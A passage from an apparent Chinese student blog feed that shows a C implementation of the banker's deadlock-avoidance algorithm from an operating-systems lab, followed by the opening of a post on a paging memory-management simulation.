class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> processNum = <span class="number">5</span>;  <span class="comment">// 记录进程个数</span></span><br><span class="line"><span class="type">int</span> resourceNum = <span class="number">3</span>; <span class="comment">// 记录资源类型个数</span></span><br><span class="line"><span class="type">int</span> requireNum = <span class="number">0</span>;  <span class="comment">// 申请进程号</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用的数据结构</span></span><br><span class="line"><span class="type">int</span> Max[<span class="number">20</span>][<span class="number">20</span>];             <span class="comment">// Max[i][j]表示进程i对j类资源的最大需求</span></span><br><span class="line"><span class="type">int</span> Allocation[<span class="number">20</span>][<span class="number">20</span>];      <span class="comment">// Allocation[i][j]表示已分配给进程i的j类资源数</span></span><br><span class="line"><span class="type">int</span> Need[<span class="number">20</span>][<span class="number">20</span>];            <span class="comment">// Need[i][j]表示进程i当前所需的j类资源数</span></span><br><span class="line"><span class="type">int</span> Available[<span class="number">20</span>];           <span class="comment">// Available[i]表示第i类资源现有资源数</span></span><br><span class="line"><span class="type">int</span> request[<span class="number">20</span>];             <span class="comment">// 申请的资源情况</span></span><br><span class="line"><span class="type">int</span> WorkStatus[<span class="number">20</span>];          <span class="comment">// 用于检查安全性的工作矩阵</span></span><br><span class="line"><span class="type">bool</span> Finished[<span class="number">20</span>] = &#123;<span class="literal">false</span>&#125;; <span class="comment">// 用于记录进程的完成情况</span></span><br><span class="line"><span class="type">int</span> Safety[<span class="number">20</span>];              <span class="comment">// 安全序列</span></span><br><span class="line"><span class="type">int</span> AllocationStatus[<span class="number">20</span>];    <span class="comment">// 试分配前Allocation的状态</span></span><br><span class="line"><span class="type">int</span> NeedStatus[<span class="number">20</span>];          <span class="comment">// 试分配前Need状态</span></span><br><span class="line"><span class="type">int</span> AvailableStatus[<span class="number">20</span>];     <span class="comment">// 试分配前Available状态</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出颜色字体</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">color_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* color_code, <span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, color_code); <span class="comment">// 设置颜色</span></span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args); <span class="comment">// 打印格式化的文本</span></span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>); <span class="comment">// 重置到默认颜色</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">red_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> &#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[31m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">blue_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span></span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[1;34m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">green_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">darkgreen_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[36m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">yellow_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[33m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">purple_printf</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* format, ...)</span> </span><br><span class="line">&#123;</span><br><span class="line">    va_list args;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[35m&quot;</span>);</span><br><span class="line">    va_start(args, format);</span><br><span class="line">    <span class="built_in">vprintf</span>(format, args);</span><br><span class="line">    va_end(args);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取最大需求矩阵 Max</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getMax</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    yellow_printf(<span class="string">&quot;Welcome!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please enter the number of processes and the number of resource classes:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;processNum, &amp;resourceNum);</span><br><span class="line">        <span class="comment">// 针对本次实验的参数要求验证</span></span><br><span class="line">        <span class="keyword">if</span> (processNum &lt; <span class="number">5</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            red_printf(<span class="string">&quot;\nIf the number of processes is at least 5, enter them again.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (resourceNum &lt; <span class="number">3</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            red_printf(<span class="string">&quot;\nThe resource category is at least 3, please re-enter it.\n&quot;</span>);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n-----------------------------------\n&quot;</span>);</span><br><span class="line">    yellow_printf(<span class="string">&quot;Please enter the Max matrix:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; processNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2d process:\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; resourceNum; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// int maxij=0;</span></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Max[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取已分配资源</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getAllocation</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------\n&quot;</span>);</span><br><span class="line">    yellow_printf(<span class="string">&quot;Please enter the Allocation matrix:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; processNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d process assigned:\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; resourceNum; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// int maxij=0;</span></span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Allocation[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// printf(&quot;\n&quot;);</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 计算需求矩阵，这一部分可以和获取资源分配同时进行，减少循环次数，这里分开写显示逻辑性</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getNeed</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; processNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; resourceNum; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            Need[i][j] = Max[i][j] - Allocation[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    green_printf(<span class="string">&quot;\nThe Need matrix is calculated\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">getAvailable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------\n&quot;</span>);</span><br><span class="line">    yellow_printf(<span class="string">&quot;Enter the Available matrix:\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;Available[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    green_printf(<span class="string">&quot;\nGot it!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 接收资源请求</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">getRequirement</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-----------------------------------\n&quot;</span>);</span><br><span class="line">    yellow_printf(<span class="string">&quot;Enter the request process number:&quot;</span>);</span><br><span class="line">    <span class="comment">// int pnum=0;</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;requireNum);</span><br><span class="line">    <span class="keyword">while</span>(requireNum&gt;processNum)</span><br><span class="line">    &#123;</span><br><span class="line">        red_printf(<span class="string">&quot;\nOps!This process does not exist!\nPlease re-enter it:&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;requireNum);</span><br><span class="line">    &#125;</span><br><span class="line">    Safety[<span class="number">0</span>] = requireNum;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The %d class resource requires:\n&quot;</span>, i + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// int num=0;</span></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;request[i]);</span><br><span class="line">        <span class="keyword">if</span> (request[i] &gt; Need[requireNum - <span class="number">1</span>][i])</span><br><span class="line">        &#123;</span><br><span class="line">            red_printf(<span class="string">&quot;\nError\nThe number of resources requested is more than the current need!\nDon&#x27;t be too greedy!\n&quot;</span>);</span><br><span class="line">            getRequirement();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (request[i] &gt; Available[i])</span><br><span class="line">        &#123;</span><br><span class="line">            red_printf(<span class="string">&quot;\nProcess %d is blocked\n&quot;</span>, requireNum);</span><br><span class="line">            getRequirement();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 保留现场</span></span><br><span class="line">            AvailableStatus[i]=Available[i];</span><br><span class="line">            AllocationStatus[i]=Allocation[requireNum<span class="number">-1</span>][i];</span><br><span class="line">            NeedStatus[i]=Need[requireNum<span class="number">-1</span>][i]; </span><br><span class="line">            <span class="comment">// 试分配</span></span><br><span class="line">            Available[i] -= request[i];</span><br><span class="line">            Allocation[requireNum - <span class="number">1</span>][i] += request[i];</span><br><span class="line">            Need[requireNum - <span class="number">1</span>][i] -= request[i];</span><br><span class="line">            Finished[requireNum - <span class="number">1</span>] = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">bool</span> <span class="title function_">is_safe</span><span class="params">()</span> <span class="comment">// 安全性判断</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, j, i1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">bool</span> t = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++) <span class="comment">// 把Available赋值给Work</span></span><br><span class="line">    &#123;</span><br><span class="line">        WorkStatus[i] = Available[i];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; processNum; i++) <span class="comment">// 初始化所有进程未完成</span></span><br><span class="line">    &#123;</span><br><span class="line">        Finished[i] = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; processNum; j++) <span class="comment">// 寻找Need小于等于Work的进程</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (Finished[j])</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            t = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (Need[j][i] &lt;= WorkStatus[i])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    t = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (t)</span><br><span class="line">                <span class="keyword">break</span>; <span class="comment">// 判断第j个进程是否满足Need小于等于Work</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (t &amp;&amp; (Finished[j] == <span class="literal">false</span>)) <span class="comment">// 是否找到Need小于等于Work的进程并且进程未完成</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                WorkStatus[i] = WorkStatus[i] + Allocation[j][i];</span><br><span class="line">            &#125;</span><br><span class="line">            Finished[j] = <span class="literal">true</span>; <span class="comment">// 进程完成</span></span><br><span class="line">            Safety[i1] = j+<span class="number">1</span>; <span class="comment">// 安全序列</span></span><br><span class="line">            i1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; processNum; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (Finished[i])</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showResource</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;-------------------------------------------\n&quot;</span>);</span><br><span class="line">    red_printf(<span class="string">&quot;Current resource situation\n&quot;</span>);</span><br><span class="line">    yellow_printf(<span class="string">&quot;process      Max      Allocation     Need\n          &quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;resourceNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            yellow_printf(<span class="string">&quot;r%d &quot;</span>,j+<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    &quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;processNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        yellow_printf(<span class="string">&quot;P%d       &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;resourceNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d &quot;</span>,Max[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;resourceNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d &quot;</span>,Allocation[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;    &quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;resourceNum;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%2d &quot;</span>,Need[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">showAvailable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    yellow_printf(<span class="string">&quot;\nAvailable\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;resourceNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        yellow_printf(<span class="string">&quot;r%d &quot;</span>,i+<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;resourceNum;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%2d &quot;</span>,Available[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 获取最大需求矩阵 Max</span></span><br><span class="line">    getMax();</span><br><span class="line">    <span class="comment">// 获取分配矩阵 Allocation</span></span><br><span class="line">    getAllocation();</span><br><span class="line">    <span class="comment">// 计算需求矩阵 Need</span></span><br><span class="line">    getNeed();</span><br><span class="line">    <span class="comment">// 获取当前可用资源</span></span><br><span class="line">    getAvailable();</span><br><span class="line">    <span class="comment">// 申请前检查一次</span></span><br><span class="line">    <span class="keyword">if</span>(!is_safe())</span><br><span class="line">    &#123;</span><br><span class="line">        red_printf(<span class="string">&quot;The current system is not secure!\nResources could not be allocated.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        green_printf(<span class="string">&quot;The system is secure.\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取请求信息</span></span><br><span class="line">            getRequirement();</span><br><span class="line">            <span class="comment">// 检查分配后的安全性</span></span><br><span class="line">            <span class="keyword">if</span>(!is_safe())</span><br><span class="line">            &#123;</span><br><span class="line">                red_printf(<span class="string">&quot;After allocation, the system is not secure.\nIt has been restored to its original state!\n&quot;</span>);</span><br><span class="line">                <span class="comment">// 恢复试分配前状态</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; resourceNum; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    Allocation[requireNum<span class="number">-1</span>][i]=AllocationStatus[i];</span><br><span class="line">                    Need[requireNum<span class="number">-1</span>][i]=NeedStatus[i];</span><br><span class="line">                    Available[i]=AvailableStatus[i];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                green_printf(<span class="string">&quot;\nThe request was successful.&quot;</span>);</span><br><span class="line">                blue_printf(<span class="string">&quot;\nA possible safety sequence would be:\n&quot;</span>);</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; processNum<span class="number">-1</span>; i++)</span><br><span class="line">                &#123;</span><br><span class="line">                    blue_printf(<span class="string">&quot;%d-&gt;&quot;</span>, Safety[i]);</span><br><span class="line">                &#125;</span><br><span class="line">                blue_printf(<span class="string">&quot;%d\n&quot;</span>,Safety[processNum<span class="number">-1</span>]);</span><br><span class="line">                <span class="comment">// 输出当前资源情况</span></span><br><span class="line">                showResource();</span><br><span class="line">                showAvailable();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// getchar();</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 大学生涯 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计操 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内存管理模拟小程序</title>
      <link href="/posts/41e39f2b.html"/>
      <url>/posts/41e39f2b.html</url>
      <cover>https://www.freeimg.cn/i/2023/12/26/658a5369cd666.jpg</cover>
      <date>Wed Nov 15 2023 00:33:08 GMT+0000</date>
      
        <content type="html"><![CDATA[<h1 id="实验三：内存管理"><a href="#实验三：内存管理" class="headerlink" title="实验三：内存管理"></a>实验三：内存管理</h1><h2 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h2><ol><li>加深对分页存储管理的原理的理解</li><li>深入理解分页存储管理如何分配和回收内存</li><li>深入理解分页存储管理中的地址变换</li></ol><h2 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h2><p>假定页面大小为 4K，物理内存 128M，设计并实现一个内存分配和回收的程序，使用 C 语言或 Python 语言编写程序实现这个程序并进行测试。</p><p>要求：</p><ol><li>至少5个进程</li><li>要求有空块管理</li><li>要求有一个逻辑地址到物理地址的变换</li></ol><h2 id="程序流程图"><a href="#程序流程图" class="headerlink" title="程序流程图"></a>程序流程图</h2><p><img src="https://www.freeimg.cn/i/2023/12/19/6581377a21e87.png" alt="流程图"></p><h2 id="程序代码"><a href="#程序代码" class="headerlink" title="程序代码"></a>程序代码</h2><p>完整代码在最后</p><h3 id="结构体与变量"><a href="#结构体与变量" class="headerlink" title="结构体与变量"></a>结构体与变量</h3><h4 id="块大小和数量"><a href="#块大小和数量" class="headerlink" title="块大小和数量"></a>块大小和数量</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define COUNT 32768   //块数量 128M/4K</span><br><span class="line">#define SIZE 4096   //块大小 4*1024</span><br></pre></td></tr></table></figure><h4 id="位视图"><a href="#位视图" class="headerlink" title="位视图"></a>位视图</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> BLOCK[COUNT];  <span class="comment">//物理块状态 0空闲1占用 使用位视图记录空块</span></span><br><span class="line"><span class="type">int</span> BlankBlockNum=COUNT;  <span class="comment">//空块数量</span></span><br></pre></td></tr></table></figure><h4 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 